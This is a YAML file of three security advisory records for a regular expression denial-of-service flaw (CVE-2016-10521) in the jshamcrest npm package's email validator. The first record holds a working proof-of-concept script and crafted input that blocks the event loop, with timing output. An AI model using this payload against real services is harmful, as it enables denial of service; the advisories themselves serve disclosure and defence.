---
- id: npmjs:npm:jshamcrest:53
  title: Regular Expression Denial of Service
  description: |-
    The `jshamcrest` package is affected by a regular expression denial of service vulnerability when certain types of user input are passed in to the emailAddress validator.


    ## Proof of concept

    ```
    var js = require('jshamcrest')
    var emailAddress = new js.JsHamcrest.Matchers.emailAddress();


    var genstr = function (len, chr) {
        var result = "";
        for (i=0; i<=len; i++) {
            result = result + chr;
        }

        return result;
    }


    for (i=1;i<=10000000;i=i+1) {
        console.log("COUNT: " + i);
        var str = '66666666666666666666666666666@ffffffffffffffffffffffffffffffff.' + genstr(i, 'a') + '{'
        console.log("LENGTH: " + str.length);
        var start = process.hrtime();
        emailAddress.matches(str)

        var end = process.hrtime(start);
        console.log(end);
    }
    ```

    ### Results
    It takes about 116 characters to get a 1.6 second event loop block.
    ```
    [ 1, 633084590 ]
    COUNT: 51
    LENGTH: 116
    ```

    # Timeline
    - October 25, 2015 - Vulnerability Identified
    - October 25, 2015 - Maintainers notified (no response)
  affected_package: jshamcrest
  vulnerable_versions:
  - ">=0.0.0"
  severity: high
  package_manager: npm
  cve:
  - CVE-2016-10521
  cwe: CWE-400
  disclosed_date: 1970-01-01
  created_date: 1970-01-01
  last_modified_date: 1970-01-01
  credit: Adam Baldwin
- id: ossindex:npm:jshamcrest:8405000461
  title: Regular Expression Denial of Service (ReDoS)
  description: "> jshamcrest is vulnerable to regular expression denial of service
    (ReDoS) when certain types of user input is passed in to the emailAddress validator.\n>
    \n> -- [nodesecurity.io](https://nodesecurity.io/advisories/53)"
  affected_package: jshamcrest
  vulnerable_versions:
  - ">=0.0.0"
  package_manager: npm
  disclosed_date: 2017-07-29
  created_date: 2017-07-29
  last_modified_date: 2017-07-30
  credit:
  - OSSIndex
  references:
  - https://nodesecurity.io/advisories/53
  - https://www.owasp.org/index.php/Regular_expression_Denial_of_Service_-_ReDoS
  source_url: https://ossindex.net/resource/package/7014012191/vulnerabilities
- id: snykio:npm:jshamcrest:20160105
  title: Regular Expression Denial of Service (ReDoS)
  description: |+
    jshamcrest\'s email address validator is vulnerable to regular
    expression denial of service ([ReDoS][1]) attack.



    [1]: https://www.owasp.org/index.php/Regular_expression_Denial_of_Service_-_ReDoS
    \n\"The Regular expression Denial of Service (ReDoS) is a Denial of
    Service attack, that exploits the fact that most Regular Expression
    implementations may reach extreme situations that cause them to work
    very slowly (exponentially related to input size). An attacker can then
    cause a program using a Regular Expression to enter these extreme
    situations and then hang for a very long time.\" \[1\]

  affected_package: jshamcrest
  vulnerable_versions:
  - "*"
  severity: high
  package_manager: npm
  cve:
  - CVE-2016-10521
  cwe:
  - CWE-400
  disclosed_date: 2016-01-05
  created_date: 2016-01-06
  last_modified_date: 2016-01-06
  credit:
  - Adam Baldwin
  references:
  - https://www.owasp.org/index.php/Regular_expression_Denial_of_Service_-_ReDoS
  source_url: https://snyk.io/vuln/npm:jshamcrest:20160105
